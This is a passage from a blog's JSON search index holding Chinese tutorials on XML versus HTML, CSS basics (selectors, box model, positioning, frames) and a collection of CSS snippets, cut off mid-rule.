SQL等程序中获取数据，将其转换为XML，然后与其他程序和平台共享这个XML。我们可以在两个通常非常困难的平台之间进行通信。\nxml和html之间的区别：\n1、XML是一种独立于软件和硬件的工具，用于传输和存储数据；它侧重于数据。HTML用于显示数据并关注数据的外观。\n2、XML提供了一个定义标记语言的框架。HTML 本身就是一种标记语言。\n3、XML 区分大小写。HTML 不区分大小写。\n4、XML既不是标签标记语言也不是编程语言。HTML是一种超文本标记语言。\n5、我们可以根据需要定义自己定义XML标签。HTML 有属于自己的预定义标签，不可以用户自己定义。\n6、XML 强制要求使用结束标记。在HTML中，没有必要使用结束标记。\n7、XML是动态的，因为它用于传输数据。HTML是静态的，因为它用于显示数据。\n8、XML 保留空格。HTML 不保留空格。\n","categories":["前端"],"tags":["html","xml"]},{"title":"css-基础（2）","url":"/2018/02/25/html+css+js+ts/2-css-%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/","content":"\n第八章 css基础知识\n\ncss基础知识：\n  - `css`样式表的定义  - `css`：（Cascading Style Sheets）层叠样式表；  - 分类及位置：内部样式\n-head区域\n\nstyle\n    标签里面  - 外部样式-`link`调用  - 内联样式-标签元素里面  - `css`内的注释：/`*`注释内容`*`/- `css`样式表的语法  - `CSS`规则由两个主要的部分构成：要添加样式的盒子名或者标签名、和要添加的样式。  - 盒子名或者标签名&#123;属性:值;&#125;  - **CSS中几种颜色的表示方法**    - 用颜色名表示      - 有17个预先确定的颜色，它们是        - `aqua`, `black`, `blue`, `fuchsia`, `gray`, `green`, `lime`, `maroon`, `navy`,          　　`olive`, `orange,` `purple`, `red`, `silver`, `teal`, `white`, and `yellow`    - **用十六进制的颜色值表示(红、绿、蓝)**      - `#FF0000`或者`#F00`    - **用rgb(r,g,b)函数表示**      - 如：`rgb(255,255,0)`    - **用hsl(Hue,Saturation,Lightness)函数表示（色调、饱和度、亮度)**      - 如：`hsl(120,100%,100%)`,色调0代表红色，`120`代表绿色，`240`代表        蓝色    - **用`rgba(r,g,b,a)`函数表示**      - 其中`a`表示的是改颜色的透明度，取值范围是`0~1`，其中`0`代表完全透明    - **用hsla(Hue,Saturation,Lightness,alpha)函数表示**      - 色调、饱和度、亮度、透明度    - 例子\n&lt;div style=&quot;position:absolute;top:0px&quot;&gt;\n  &lt;div style=&quot;background-color:gray;&quot;&gt;background-color:gray&lt;/div&gt;\n  &lt;div style=&quot;background-color:#F00;&quot;&gt;background-color:#F00&lt;/div&gt;\n  &lt;div style=&quot;background-color:#ffff00;&quot;&gt;background-color:#ffff00&lt;/div&gt;\n  &lt;div style=&quot;background-color:rgb(255,0,255);&quot;&gt;background-color:rgb(255,0,255)&lt;/div&gt;\n  &lt;div style=&quot;background-color:hsl(120,80%,50%);&quot;&gt;background-color:hsl(120,80%,50%)&lt;/div&gt;\n  &lt;div style=&quot;background-color:rgba(255,0,255,0.5);&quot;&gt;background-color:rgba(255,0,255,0.5)&lt;/div&gt;\n  &lt;div style=&quot;background-color:hsla(120,80%,50%,0.5);&quot;&gt;background-color:hsla(120,80%,50%,0.5)&lt;/div&gt;\n&lt;/div&gt;\n![img](http://upload-images.jianshu.io/upload_images/1480597-39e61a813f637282.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)- 内部样式表  - 当单个页面需要设置样式时，就应该使用内部样式表。  - 使用 ``标签在文档``里面定义内部样式表\n&lt;head&gt;\n &lt;style type=&quot;text/css&quot; &gt;\np&#123;color:red;&#125;\n &lt;/style&gt;\n&lt;/head&gt;\n- 从外部引入到样式分为两种：（注意写在`head`标签里面）- 当样式需要应用于很多页面时，就需要用到外部样式表，首先需要创建一个`css`文件，然后引用到我们的页面中。- `Link`样式表式： ``- `Html`式： `@import url(&quot;css.css&quot;);&gt;`- 内联样式表（优先级高）  - 写在标签里面的样式  - 如：``- 表示给`p`标签里面的文字颜色设置为红色- 区别：外链样式与导入样式  - `link`标签是属于`xhtml`范畴，而`@import`则是`css2.1`中特有的。`link`标签除了可以加载`CSS`外，还可以做很多其它的事情，比如定义`RSS`，定义`rel`连接属性等，`@import`就只能加载`CSS`了。  - 加载的顺序的区别，`link`加载的`css`时，是一种并行(没有尝试是否是这样)加载`CSS`方式，而`@impor`则在整个页面加载完成后才加载。  - 兼容性的区别，因`@import``CSS2.1`才特有的，所以对于不兼容`CSS2.1`的浏览器来说，无效。  - 在样式控制上(比如动态改变网页的布局时,使用`javascript`操作`DOM`)的区别，此时`@import`就无能为力了。------- 样式的优先级补充  - 相同权值情况下，\n  CSS\n      样式的优先级总结来说，就是——就近原则（离被设置元素越近优先级别越高）：    - `内联样式表（标签内部）` &gt; `嵌入样式表（当前文件中）`&gt; `外部样式表（外部文件中）`- 权值不同时，浏览器是根据权值来判断使用哪种`css`样式的，哪种样式权值高就使用哪种样式- 层叠优先级是:  - `浏览器缺省`&lt; `外部样式表` &lt; `内部样式表` &lt; `内联样式`- 其中样式表又有:`类选择器` &lt; `类派生选择器`&lt;`ID选择器` &lt; `ID派生选择器`- 派生选择器以前叫上下文选择器，所以完整的层叠优先级是:  - `浏览器缺省` &lt;`外部样式表` &lt; `外部样式表类选择器` &lt; `外部样式表类派生选择器`&lt; `外部样式表ID选择器` &lt; `外部样式表ID派生选择器`&lt; `内部样式表` &lt; `内部样式表类选择器` &lt; `内部样式表类派生选择器` &lt; `内部样式表ID选择器` &lt; `内部样式表ID派生选择器` &lt; `内联样式`…共`12`个优先级- 另外，如果同一个元素在没有其他样式的作用影响下，其`Class`定义了多个并以空格分开，其优先级顺序为：  - 一个元素同时应用多个`class`，后定义的优先（即近者优先），加上`!important`者最优先！------#### 第九章 css选择器(上)- ```  css选择器：\n\n- `class`类选择器可以重复利用\n- `id`选择器唯一\n\n\n标签选择器\n\n什么是选择器：css选择器就是要改变样式的对象\n\n\n选择器&#123;属性:值;属性:值;&#125;\n\n标签选择器：页面中所有的标签都是一个选择器 p&#123;color:red;&#125;\n\nID选择器\n\n选择id命名的元素 以 # 开头 #p1&#123;color:#0f0;&#125;\n\n\n类选择器\n\nclass选择器，选择clas命名的元素 以.开头 .first&#123;color:#00f;&#125;\n\n\ncss代码写完后上线前要经过压缩处理\n\n本地和服务器分两个css版本（备份）\n\n压缩后注释都清除，空间体积减少\n\n群组选择器\n\n选择多个元素,以逗号隔开 #main,.first,span,a,h1&#123;color:red;&#125;\n\n\n包含选择器\n\n选择某元素的后代元素，也称后代选择器，父类与子类间以空格隔开p\n\nspan&#123;color:red;&#125;\n\n\n\n\n属性选择器\n\n选择包含某一属性的元素\na[title]&#123;color:red;&#125; 选择包含title的a标签\na[title][href]&#123;color:red;&#125; 选择包含title和href的a标签\n\n\n&gt; + 选择器子类选择器：只选择子元素（只选择儿子）（相当于包含元素）\n\np &gt; span&#123;color:red;&#125;\n\n\n相邻兄弟选择器：只选择后面的相邻兄弟元素\n\np + span&#123;color:red;&#125;\n\n\n\n\n第十章 css选择器(下)\n\n&#96;&#96;&#96;伪类选择器\n  - `a:link &#123;color:#FF0000;&#125;` / *未访问的链接* / （只用于a标签）  - `a:visited &#123;color:#00FF00;&#125;` / *已访问的链接* / （只用于a标签）  - `a:hover &#123;color:#FF00FF;&#125;`/* 鼠标移动到链接上  - `*/`（可和其他标签结合一起用）  - `a:active &#123;color:#0000FF;&#125;` / *选定的链接* /  - 注意    - 伪类选择器的排序很重要，`a:link` `a:visited` `a:hover` `a:active`，记作`lvha`  - 输入伪类选择器（针对表单）  - `input:focus&#123;color:red;&#125;` / *键盘输入焦点* /- 其他伪类选择器  - `p:first-child&#123;color:red;&#125;` /`* 第一个p *`/  - `:before` 在元素之前添加内容。  - `:after` 在元素之后添加内容。- `css`优先规则  - 内联样式表-&gt; `ID` 选择器—&gt; `Class` 类选择器-&gt;标签选择器------#### 第十一章 背景属性------- 背景属性：  - 背景的添加 ：  - 背景颜色的添加:    - `background:red;`    - `backgronnd-color:red;`  - 背景图片的添加：    - `background:url(“images/1.jpg”);`    - `backgronnd-image:url(“images/1.jpg”);`  - 背景的平铺  - 什么是平铺？平铺就是图片是否重复出现    - 不平铺：`background-repeat:no-repeat;`    - 水平方向平铺：`background-repeat:repeat-x;`    - 垂直方向平铺：`background-repeat:repeat-y;`    - 完全平铺：默认为完全平铺  - 背景图片的定位    - 背景图片的定位就是可以设置显示背景图片的位置，通过属性`background-position`来实现    - `background-position`的取值可为英文单词或者数值和百分值。    - `background-positon`的英文单词取值    - `top left`    - `top center`    - `top right`    - `center left`    - `center center`    - `center right`    - `bottom left`    - `bottom center`    - `ottom right`  - ```    background-positon\n\n  的数值取值\n\nbackground-position:x y;\n\npositon\n    的百分值取值    - `background-position:x% y%;`  - 背景图片的大小    - 背景图片的大小可以通过属性`background-size`来设置`background-size`的取值可为数值和百分值。  - `background-size`的数值取值    - `background-size:x y;`  - `background-size`的数值取值    - `background-size:x% y%;`  - 背景图片的滚动    - 背景图片是否随着内容的滚动而滚动由`background-attachment`设置    - `background-attachment:fixed;` 固定，不随内容的滚动而滚动    - `background-attachment:scroll;` 滚动，随内容的滚动而滚动------#### 第十二章 文字文本属性------- `css`文字文本属性：  - **文字属性**    - `color:red;` 文字颜色    - `font-size:12px`; 文字大小    - `font-weight:“bold”` 文字粗细(`bold/normal`)    - `font-family:“宋体”` 文字字体    - `font-variant:small-caps`小写字母以大写字母显示- **文本属性**  - `text-align:center;` 文本对齐(`right`/`left`/`center`)  - `line-height:10px;` 行间距(可通过它实现文本的垂直居中)  - `text-indent:20px;` 首行缩进  - ```    text-decoration:none;\n\n- 文本线(`none`/`underline`/`overline`/`line-through`)\n\n\nletter-spacing: 字间距\n\n\n\n\n\n第十三章 盒子模型\n\n盒子模型\n\n盒子模型就是一个有高度和宽度的矩形区域\n所有html标签都是盒子模型\ndiv标签自定义盒子模型\n\n\n所有的标签都是盒子模型\n\nclass和id的主要差别是：class用于元素组（类似的元素，或者可以理解为某一类元素），而id用于标识单独的唯一的元素。\n\n\n盒子模型的组成\n\n盒子模型组成部分：\n自身内容：width、height 宽高\n内边距： padding\n盒子边框： border 边框线\n与其他盒子距离： margin外边距\n内容+内边距+边框+外边距&#x3D;面积\n\n\n\n\nborder 边框\n\n常见写法 border:1px solid #f00;\n\n\n单独属性：\n\nborder-width:\n\n&#96;&#96;&#96;border-style:\n    - `dotted` 点状虚线    - `dashed`（虚线）    - `solid`（实线）    - `double`（双实线）  - `border-color` (颜色)- `padding` 内边距  - 值：`像素`/`厘米`等长度单位、百分比    - `padding:10px;` 上下左右    - `padding:10px 10px;` 上下 左右    - `padding:10px 10px 10px;` 上 左右 下    - `padding:10px 10px 10px 10px;` 上 右 下 左（设置4个点–&gt;顺时针方向）- 单独属性：  - `padding-top:`  - `padding-right:`  - `padding-bottom:`  - `padding-left:`- 当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据`width`和`height`减小- margin 外边距  - 值：与`padding`相同  - 单独属性：与`padding`相同- 外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并------**补充盒子模型内容**------- **标准盒子模型**  - 盒子模型是`css`中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 `ie`盒子模型和标准 `w3c` 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型![img](http://upload-images.jianshu.io/upload_images/1480597-320bad065d62c499.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)- 从上图可以看到标准 `w3c` 盒子模型的范围包括 `margin`、`border`、`padding`、`content`，并且 `content`部分不包含其他部分- **IE盒子模型**![img](http://upload-images.jianshu.io/upload_images/1480597-693242e2f03506f8.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)- 从上图可以看到 `ie`盒子模型的范围也包括 `margin`、`border`、`padding`、`content`- 和标准 `w3c` 盒子模型不同的是：`ie` 盒子模型的 `content` 部分包含了 `border`和 `padding`- `IE`盒子模型`width` = `padding`+`border`+`内容`- 标准盒子模型 = 内容的宽度（不包含`border`+`padding`）- 例：  - 一个盒子的 `margin`为 20px，`border` 为 1px，`padding`为 10px，`content` 的宽为 200px、高为 50px，假如用标准 `w3c` 盒子模型解释，那么这个盒子需要占据的位置为：宽 `20*2+1*2+10*2+200=262px`、高 `20*2+1*2*10*2+50=112px`，盒子的实际大小为：宽 `1*2+10*2+200=222px`、高 `1*2+10*2+50=72px`；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 `20*2+200=240px`、高 `20*2+50=70px`，盒子的实际大小为：宽 `200px`、高 `50px`- 那应该选择哪中盒子模型呢？当然是“标准 `w3c` 盒子模型”了。怎么样才算是选择了“标准 `w3c`盒子模型”呢？很简单，就是在网页的顶部加上 `doctype` 声明。- 假如不加`doctype` 声明，那么各个浏览器会根据自己的行为去理解网页，即 `ie`浏览器会采用 `ie` 盒子模型去解释你的盒子，而 `ff`会采用标准`w3c` 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。- 反之，假如加上了 `doctype` 声明，那么所有浏览器都会采用标准 `w3c`盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。------- 用 `jquery` 做的例子来证实一下\n\n\n\n\n\n你用的盒子模型是？\n\n\nvar sbox = $.boxmodel ? \"标准w3c\":\"ie\";\ndocument.write(\"您的页面目前支持：\"+sbox+\"盒子模型\");\n\n\n\n\n\n- 　上面的代码没有加上 `doctype` 声明，在 `ie` 浏览器中显示 `ie`盒子模型，在 ff 浏览器中显示“标准`w3c` 盒子模型”。\n\n\n\n你用的盒子模型是标准w3c盒子模型\n\n\nvar sbox = $.boxmodel ? \"标准w3c\":\"ie\";\ndocument.write(\"您的页面目前支持：\"+sbox+\"盒子模型\");\n\n\n\n\n\n- 　代码2 与代码1 唯一的不同的就是顶部加了 `doctype`声明。在所有浏览器中都显示“标准 `w3c`盒子模型”- 所以为了让网页能兼容各个浏览器，让我们用标准 `w3c` 盒子模型------#### 第十四章 块元素、行元素与溢出------- 基本概念  - 块级元素：默认情况下独占一行的元素，可控制宽高、上下边距；  - 行内元素：默认情况下一行可以摆放多个的元素，不可控制宽高和上下边距- 行块转换  - `display:none`; 不显示  - `display:block`; 变成块级元素  - `display:inline`; 变成行级元素  - `display:inline-block`; 以块级元素样式展示，以行级元素样式排列- 溢出  - `overflow:hidden`; 溢出隐藏  - `overflow:scroll`; 内容会被修剪，浏览器会显示滚动条  - `overflow:auto`; 如果内容被修剪，则产生滚动条- 文本不换行：`white-space:nowrap`;- 长单词换行：`word-wrap:break-word`;- 行内元素和快级元素小结  - 一、**块级元素**：block element    - 每个块级元素默认占一行高度，一行内添加一个块级元素后无法一般无法添加其他元素（`float`浮动后除外）。两个块级元素连续编辑时，会在页面自动换行显示。块级元素一般可嵌套块级元素或行内元素；    - 块级元素一般作为容器出现，用来组织结构，但并不全是如此。有些块级元素，如只能包含块级元素。    - `DIV` 是最常用的块级元素，元素样式的`display:block`都是块级元素。它们总是以一个块的形式表现出来，并且跟同级的兄弟块依次竖直排列，左右撑满。  - 二、**行内元素**：inline element    - 也叫内联元素、内嵌元素等；行内元素一般都是基于语义级(semantic)的基本元素，只能容纳文本或其他内联元素，常见内联元素 “a”。比如 `SPAN`元素，`IFRAME`元素和元素样式的`display : inline`的都是行内元素。例如文字这类元素，各个字母 之间横向排列，到最右端自动折行。  - 三、**block（块）元素的特点:**    - ①、总是在新行上开始；    - ②、高度，行高以及外边距和内边距都可控制；    - ③、宽度缺省是它的容器的100%，除非设定一个宽度。    - ④、它可以容纳内联元素和其他块元素  - 四、**inline元素的特点**    - ①、和其他元素都在一行上；    - ②、高，行高及外边距和内边距不可改变；    - ③、宽度就是它的文字或图片的宽度，不可改变    - ④、内联元素只能容纳文本或者其他内联元素  - **对行内元素，需要注意如下**:    - 设置宽度`width` 无效。 设置高度`height`无效，可以通过`line-height`来设置。 设置`margin`    - 只有左右`margin`有效，上下无效。    - 设置`padding`只有左右`padding`有效，上下则无效。注意元素范围是增大了，但是对元素周围的内容是没影响的。  - 五、**常见的块状元素**    - `address` – 地址    - `blockquote` – 块引用    - `center` – 举中对齐块    - `dir` – 目录列表    - `div` – 常用块级容易，也是`CSS layout`的主要标签    - `dl` – 定义列表    - `fieldset` – `form`控制组    - `form` – 交互表单    - `h1` – 大标题    - `h2` – 副标题    - `h3` – 3级标题    - `h4` – 4级标题    - `h5` – 5级标题    - `h6` – 6级标题    - `hr` – 水平分隔线    - `isindex` – `input prompt`    - `menu` – 菜单列表    - `noframes` – `frames`可选内容，（对于不支持frame的浏览器显示此区块内容    - `noscript` – 可选脚本内容（对于不支持`script`的浏览器显示此内容）    - `ol` – 有序表单    - `p` – 段落    - `pre` – 格式化文本    - `table` – 表格    - `ul` – 无序列表  - 六、**常见的内联元素**    - `a` – 锚点    - `abbr` – 缩写    - `acronym` – 首字    - `b` – 粗体(不推荐)    - `bdo` – `bidi override`    - `big` – 大字体    - `br` – 换行    - `cite` – 引用    - `code` – 计算机代码(在引用源码的时候需要)    - `dfn` – 定义字段    - `em` – 强调    - `font` – 字体设定(不推荐)    - `i` – 斜体    - `img` – 图片    - `input` – 输入框    - `kbd` – 定义键盘文本    - `label` – 表格标签    - `q` – 短引用    - `s` – 中划线(不推荐)    - `samp` – 定义范例计算机代码    - `select` – 项目选择    - `small` – 小字体文本    - `span` – 常用内联容器，定义文本内区块    - `strike` – 中划线    - `strong` – 粗体强调    - `sub` – 下标    - `sup` – 上标    - `textarea` – 多行文本输入框    - `tt` – 电传文本    - `u` – 下划线  - 七，**可变元素**    - 可变元素为根据上下文语境决定该元素为块元素或者内联元素。    - `applet` - `java applet`    - `button` - 按钮    - `del`- 删除文本    - `iframe` - `inline frame`    - `ins` - 插入的文本    - `map` - 图片区块(`map`)    - `object` - `object`对象    - `script` - 客户端脚本  - 八、**行内元素与块级元素有什么不同**    - 区别一：      - 块级：块级元素会独占一行，默认情况下宽度自动填满其父元素宽度      - 行内：行内元素不会独占一行，相邻的行内元素会排在同一行。其宽度随内容的变化而变化。    - 区别二：      - 块级：块级元素可以设置宽高      - 行内：行内元素不可以设置宽高    - 区别三：      - 块级：块级元素可以设置`margin`，`padding`      - 行内：行内元素水平方向的`margin-left;` `margin-right;`    - `padding-left;` `padding-right`;可以生效。但是竖直方向的`margin-bottom`; `margin-top`; `padding-top`; `padding-bottom`;却不能生效。    - 区别四：      - 块级：`display:block`;      - 行内：`display:inline`;  - 替换元素有如下：（和`img`一样的设置方法）    - ``、``、``、``    - ``都是替换元素，这些元素都没有实际的内容- 可以通过修改`display`属性来切换块级元素和行内元素------#### 第十五章 定位------- `static`静态定位（不对它的位置进行改变，在哪里就在那里）  - 默认值。没有定位，元素出现在正常的流中（忽略 `top`,`bottom,` `left, right` 或者 `z-index` 声明）。- `fixed`固定定位（参照物–浏览器窗口）—做 弹窗广告用到  - 生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 `&quot;left&quot;`, `&quot;top&quot;`, `&quot;right&quot;`以及 `&quot;bottom&quot;`属性进行规定。- `relative`（相对定位 ）（参照物以他本身）  - 生成相对定位的元素，相对于其正常位置进行定位。- `absolute`（绝对定位）(除了`static`都可以，找到参照物–&gt;与它最近的已经有定位的父元素进行定位)  - 生成绝对定位的元素，相对于 `static` 定位以外的第一个父元素进行定位。  - 元素的位置通过 “`left&quot;`, `&quot;top&quot;`, `&quot;right&quot;` 以及 `&quot;bottom&quot;` 属性进行规定- z-index  - `z-index` 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。  - 定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。- 一切皆为框  - 块级元素: `div`、`h1`或`p`元素 即：显示为一块内容称之为 “块框“ ;  - 行内元素: `span`,`strong`,`a`等元素 即：内容显示在行中称 “行内框”;  - 使用display属性改变成框的类型 即：`display:block`; 让行内元素设置为块级元素，`display:none;` 没有框- 相对定位：  - 如果对一个元素进行相对定位，它将出现在它所在的位置上。  - 通过设置垂直或水平位置，让这个元素“相对于”它的起点进行移动  - `.adv_relative &#123; position: relative; left: 30px; top: 20px; &#125;`- 绝对定位：  - 元素的位置相对于最近的已定位祖先元素，如果元素没有已定位 的祖先元素，它的位置相对于最初的包含块。 `.adv_absolute &#123; position: absolute; left: 30px; top: 20px; &#125;`------![img](http://upload-images.jianshu.io/upload_images/1480597-f72c1c8486445df1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)![img](http://upload-images.jianshu.io/upload_images/1480597-7ab9cda0bbd7e62f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)------#### 第十六章 框架------- frameset框架：  - `` —- 用来定义一个框架；双标签    不能和 `` 一起使用- `rows`、`cols`属性  - `rows` 定义行表示框架有多少行（取值 `px`/`%`/ `*` ）  - `cols` 定义列表示框架有多少列（取值`px`/ `%`/ `*` ）- frame子框架  - &lt;`frame`&gt; —- 表示框架中的某一个部分；单标签，要跟结束标志    - `src` 显示的网页的路径    - `name` 框架名    - `frameborder` 边框线（取值 0 / 1）  - &lt;`noframes`&gt;属性  - &lt;`noframes`&gt; 提供不支持框架的浏览器显示`body`的内容；双标签\n\n     \n     \n     \n     \n      内容\n     \n\n- &lt;iframe&gt;内联框架    - `iframe`元素会创建包含另外一个文档的内联框架（即行内框架）  - 允许和 `body` 一起使用  - `width` 宽（取值 px / %）  - `height` 高（取值 px / %）  - `name` 框架名  - `frameborder` 边框线（取值 0 / 1）  - `src` 显示的网页的路径------#### 第十七章 css高级属性------- opacity透明属性    - ```    opacity\n\n- 对于`IE6/7/`，使用`filter:alpha(opacity:值;`) 值为`0-100`\n- 对于`Webkit`，`Opera`，`Firefox`，`IE9+`，使用`opacity`:值; 值为`0-1`\n- 对于早期火狐，使用`-moz-opacity`:值; 值为`0-1`\n- 所以写透明属性时，一般写法是\n\n &#123;\t    opacity:0.5;   filter:alpha(opacity：50);/*0-100*/   -moz-opacity:0.5;\t/*取值0-1*/--&gt;针对早起版本的火狐兼容问题的解决&#125;\n\n\nborder-radius圆角边框属性\n\n向div元素添加圆角边框\n\nborder-radius:10px;\n\n\n\n\nbox-shadow阴影属性\n\nbox-shadow属性向框添加阴影效果,后面跟4个参数。\nbox-shadow:0px 0px 10px #000;\n\n\n属性\n\n是HTML5中新增的标签,媒体嵌入插件标签，可以通过&#96;&#96;插入音频或视频\n格式.mid .wav .mp3等\n\n\n\n\n\nCSS部分导图总结\n\n\n\n","categories":["css"],"tags":["css"]},{"title":"css-60个常见案例","url":"/2018/03/01/html+css+js+ts/2-css-%E5%AE%9E%E7%94%A8%E7%9A%8460%E4%B8%AACSS%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5/","content":"1、垂直对齐\n如果你用CSS，则你会有困惑：我该怎么垂直对齐容器中的元素？现在，利用CSS3的Transform，可以很优雅的解决这个困惑：\n.verticalcenter&#123;    position: relative;    top: 50%;    -webkit-transform: translateY(-50%);    -o-transform: translateY(-50%);    transform: translateY(-50%);&#125;\n\n使用这个技巧，从单行文本、段落到box，都会垂直对齐。目前浏览器对Transform的支持是需要关注的，Chrome 4, Opera 10, Safari 3, Firefox 3, and Internet Explorer 9均支持该属性\n2、伸展一个元素到窗口高度\n在具体场景中，你可能想要将一个元素伸展到窗口高度，基本元素的调整只能调整容器的大小,因此要使一个元素伸展到窗口高度，我们需要伸展顶层元素：html和body:\nhtml, body &#123;    height: 100%;&#125;\n\n然后将100%应用到任何元素的高\ndiv &#123;    height: 100%;&#125;\n\n3、基于文件格式使用不同的样式\n为了更容易知道链接的目标，有时你想让一些链接看起来和其它的不同。下面的片段在文本链接前添加一个图标，对不同的资源使用不同的图标或图片：\na[href^=&quot;http://&quot;]&#123;    padding-right: 20px;    background: url(external.gif) no-repeat center right;&#125;/* emails */a[href^=&quot;mailto:&quot;]&#123;    padding-right: 20px;    background: url(email.png) no-repeat center right;&#125;/* pdfs */a[href$=&quot;.pdf&quot;]&#123;    padding-right: 20px;    background: url(pdf.png) no-repeat center right;&#125;\n\n效果演示\n4、创建跨浏览器的图像灰度\n灰度有时看起来简约和优雅，能为网站呈现更深层次的色调。在示例中，我们将对一个SVG图像添加灰度过滤：\n&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;    &lt;filter id=&quot;grayscale&quot;&gt;        &lt;feColorMatrix type=&quot;matrix&quot; values=&quot;0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0&quot;/&gt;    &lt;/filter&gt;&lt;/svg&gt;\n\n为了跨浏览器，会用到filter属性：\nimg &#123;    filter: url(filters.svg#grayscale); /* Firefox 3.5+ */    filter: gray; /* IE6-9 */    -webkit-filter: grayscale(1); /* Google Chrome, Safari 6+ &amp; Opera 15+ */&#125;\n\n5、背景渐变动画\nCSS中最具诱惑的一个功能是能添加动画效果，除了渐变，你可以给背景色、透明度、元素大小添加动画。目前，你不能为渐变添加动画，但下面的代码可能有帮助。它通过改变背景位置，让它看起来有动画效果。\nbutton &#123;    background-image: linear-gradient(#5187c4, #1c2f45);    background-size: auto 200%;    background-position: 0 100%;    transition: background-position 0.5s;&#125;    button:hover &#123;    background-position: 0 0;&#125;\n\n效果演示：\n6、CSS：表格列宽自适用\n对于表格，当谈到调整列宽时，是比较痛苦的。然后，这里有一个可以使用的技巧：给td元素添加white-space: nowrap;能让文本正确的换行\ntd &#123;    white-space: nowrap;&#125;\n\n演示\n7、只在一边或两边显示盒子阴影\n如果你要一个盒阴影，试试这个技巧，能为任一边添加阴影。为了实现这个，首先定义一个有具体宽高的盒子，然后正确定位:after伪类。实现底边阴影的代码如下\n.box-shadow &#123;    background-color: #FF8020;    width: 160px;    height: 90px;    margin-top: -45px;    margin-left: -80px;    position: absolute;    top: 50%;    left: 50%;&#125;.box-shadow:after &#123;    content: &quot;&quot;;    width: 150px;    height: 1px;    margin-top: 88px;    margin-left: -75px;    display: block;    position: absolute;    left: 50%;    z-index: -1;    -webkit-box-shadow: 0px 0px 8px 2px #000000;       -moz-box-shadow: 0px 0px 8px 2px #000000;            box-shadow: 0px 0px 8px 2px #000000;&#125;\n\n演示\n8、包裹长文本\n如果你碰到一个比自身容器长的文本，这个技巧对你很有用。在这个示例中，默认时，不管容器的宽度，文本都将水平填充。\n\n简单的CSS代码就能在容器中调整文本：\npre &#123;    white-space: pre-line;    word-wrap: break-word;&#125;\n\n效果看起来如下：\n\n9、制造模糊文本\n想要让文本模糊？可以使用color透明和text-shadow实现\n.blurry-text &#123;   color: transparent;   text-shadow: 0 0 5px rgba(0,0,0,0.5);&#125;\n\n演示\n10、用CSS动画实现省略号动画\n这个片段将帮助你制造一个ellipsis的动画，对于简单的加载状态是很有用的，而不用去使用gif图像。\n.loading:after &#123;    overflow: hidden;    display: inline-block;    vertical-align: bottom;    animation: ellipsis 2s infinite;    content: &quot;\\2026&quot;; /* ascii code for the ellipsis character */&#125;@keyframes ellipsis &#123;    from &#123;        width: 2px;    &#125;    to &#123;        width: 15px;    &#125;&#125;\n\n演示\n11、样式重置\nhtml, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video &#123;  margin: 0;  padding: 0;  border: 0;  font-size: 100%;  font: inherit;  vertical-align: baseline;  outline: none;  -webkit-box-sizing: border-box;  -moz-box-sizing: border-box;  box-sizing: border-box;&#125;html &#123; height: 101%; &#125;body &#123; font-size: 62.5%; line-height: 1; font-family: Arial, Tahoma, sans-serif; &#125;article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section &#123; display: block; &#125;ol, ul &#123; list-style: none; &#125;blockquote, q &#123; quotes: none; &#125;blockquote:before, blockquote:after, q:before, q:after &#123; content: &#x27;&#x27;; content: none; &#125;strong &#123; font-weight: bold; &#125; table &#123; border-collapse: collapse; border-spacing: 0; &#125;img &#123; border: 0; max-width: 100%; &#125;p &#123; font-size: 1.2em; line-height: 1.0em; color: #333; &#125;\n\n12、典型的CSS清除浮动\n.clearfix:after &#123; content: &quot;.&quot;; display: block; clear: both; visibility: hidden; line-height: 0; height: 0; &#125;.clearfix &#123; display: inline-block; &#125;html[xmlns] .clearfix &#123; display: block; &#125;* html .clearfix &#123; height: 1%; &#125;\n\n13、新版清除浮动（2011）\n.clearfix:before, .container:after &#123; content: &quot;&quot;; display: table; &#125;.clearfix:after &#123; clear: both; &#125;/* IE 6/7 */.clearfix &#123; zoom: 1; &#125;\n\n14、跨浏览器的透明\n.transparent &#123;    filter: alpha(opacity=50); /* internet explorer */    -khtml-opacity: 0.5;      /* khtml, old safari */    -moz-opacity: 0.5;       /* mozilla, netscape */    opacity: 0.5;           /* fx, safari, opera */&#125;\n\n15、CSS引用模板\nblockquote &#123;    background: #f9f9f9;    border-left: 10px solid #ccc;    margin: 1.5em 10px;    padding: .5em 10px;    quotes: &quot;\\201C&quot;&quot;\\201D&quot;&quot;\\2018&quot;&quot;\\2019&quot;;&#125;blockquote:before &#123;    color: #ccc;    content: open-quote;    font-size: 4em;    line-height: .1em;    margin-right: .25em;    vertical-align: -.4em;&#125;blockquote p &#123;    display: inline;&#125;\n\n16、个性圆角\n#container &#123;    -webkit-border-radius: 4px 3px 6px 10px;    -moz-border-radius: 4px 3px 6px 10px;    -o-border-radius: 4px 3px 6px 10px;    border-radius: 4px 3px 6px 10px;&#125;/* alternative syntax broken into each line */#container &#123;    